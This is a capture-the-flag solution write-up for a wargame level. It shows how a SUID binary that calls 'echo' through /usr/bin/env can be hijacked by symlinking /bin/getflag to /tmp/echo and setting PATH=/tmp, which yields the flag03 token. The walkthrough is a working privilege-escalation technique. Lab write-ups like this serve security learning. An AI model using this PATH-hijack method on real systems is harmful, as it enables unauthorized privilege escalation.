### Solution

1. **List files in the home directory:**

	```bash
	ls -l
	```

	You’ll see the following SUID binary:

	```
	-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
	```

	This binary is **owned by `flag03`** and **has the SUID bit set**, meaning it runs with `flag03`’s privileges when executed.

2. **Analyze the binary with Ghidra:**

	Using Ghidra you’ll discover the binary runs:

	```c
	system("/usr/bin/env echo Exploit me");
	```

	This means it uses `/usr/bin/env` to find and execute the first `echo` command in your `$PATH`.

3. **Exploit it by creating a link between files**

	Create a directory and a fake `echo` that actually runs `getflag`:

	```bash
	ln -s /bin/getflag /tmp/echo
	```

4. **Set your custom `PATH`**

	```bash
	export PATH=/tmp
	```

5. **Run the vulnerable binary**

	```bash
	./level03
	```

	Since the binary runs `system("/usr/bin/env echo ...")`, and your `PATH` has a fake `echo`, this runs:

	```
	/bin/getflag
	```

	You’ll receive the `flag03` token.
